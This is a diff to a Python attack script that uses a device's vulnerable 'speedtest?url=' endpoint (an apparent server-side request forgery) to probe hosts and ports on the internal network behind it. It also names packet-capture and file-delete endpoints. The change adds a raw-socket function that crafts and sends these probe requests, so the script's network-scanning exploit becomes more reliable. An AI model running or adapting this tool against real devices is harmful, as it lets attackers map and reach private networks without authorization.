@@ -13,6 +13,7 @@
 import sys
 import requests
 import ipaddress
+import socket
 
 VULN_ENDPOINT = 'speedtest?url='
 INFO_ENDPOINT = 'netconfig.html?ref=diagnostics.html'
@@ -23,7 +24,7 @@ PCAP_DELETE_ENDPOINT = 'delete?filename=sd%2Fbs.pcap&delete=Delete'
 PCAP_SAVE_LOCATION = '/tmp/capture.pcap'
 IP_LINE = '<b>Current IP:</b> '
 NET_LINE = '<b>Netmask:</b> '
-TEST_PORTS = {1337}
+TEST_PORTS = {80}
 REQ_HEAD = {
     'User-Agent': 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0',   # for the lulz
     'Access-Control-Allow-Origin': '*',
@@ -32,7 +33,6 @@ REQ_HEAD = {
     'Accept-Encoding': 'gzip, deflate, br',
     'Cookie': 'language=en; updateTips=true; enableAnonymous8888=false; enableAnonymous9988=false',
     'DNT': '1',
-    'Connection': 'close',
     'Upgrade-Insecure-Requests': '1'
 }
 
@@ -89,6 +89,52 @@ def check_args(args):
         return 1
       
     return 0
+
+# Try using socket for the probing because some devices return HTTP status code 0
+# and requests doesn't like that.
+def probe_request(ip, port):
+    request = f"GET /{VULN_ENDPOINT}{ip}:{str(port)} HTTP/1.1\r\n"
+    request += f"Host: {ext_ip}:{str(ext_port)}\r\n"
+    for key, value in REQ_HEAD.items():
+        request += f"{key}: {value}\r\n"
+    
+    request += f"\r\n\r\n"
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    except socket.error as e:
+        print(f"Error creating socket: {e}")
+        exit(1)
+    
+    try:
+        sock.connect((str(ext_ip), ext_port))
+    except socket.gaierror as e:
+        print(f"Address-related error connecting to server: {e}")
+        exit(1)
+    
+    try:
+        sock.send(request.encode())
+        sock.shutdown(socket.SHUT_WR)
+    except socket.error as e:
+        print(f"Error sending request: {e}")
+        exit(1)
+    
+    response = ''   
+    while True:
+        try:
+            data = sock.recv(1024)
+            if not data:
+                break
+            response += data.decode('utf-8')
+        except socket.error as e:
+            print(f"Error receiving data: {e}")
+            exit(1)    
+    
+    # print(f"\nRESPONSE LENGTH: {len(response)}")
+    # exit(0)
+    
+    response = response.split('\r\n\r\n')[1].split('\r\n')[1].strip('<br>')
+    return response
 
 # Collect network traffic through Network Diagnostics packet capturing
 pcap_running = False
@@ -190,22 +236,13 @@ def main(args):
     for ip in ipaddress.ip_network(int_net).hosts():
         for port in TEST_PORTS:
             print(f"Probing Host: {ip}:{port}", end='\r')
-            req_string = f"{req_base}/{VULN_ENDPOINT}{ip}:{port}"
-            response = None
+            response = probe_request(ip, port)
 
-            try:
-                response = requests.get(req_string, headers=req_headers)
-            except Exception as e:
-                print(f"Could not complete request. : {e}")
-                if (pcap_running):
-                    pcap_collect(False)
-                exit(1)
-                
-            if 'No route to host' not in response.text.strip():
+            if 'No route to host' not in response.strip():
                 print("\r", end='')
-                print(f"Hit: {ip}:{port} <-> {response.text.strip()}")
-
+                print(f"Hit: {ip}:{port} <-> Result: {response.strip()}")
                 result_list.append(ip)
+
 
 if __name__ == '__main__':
     try:
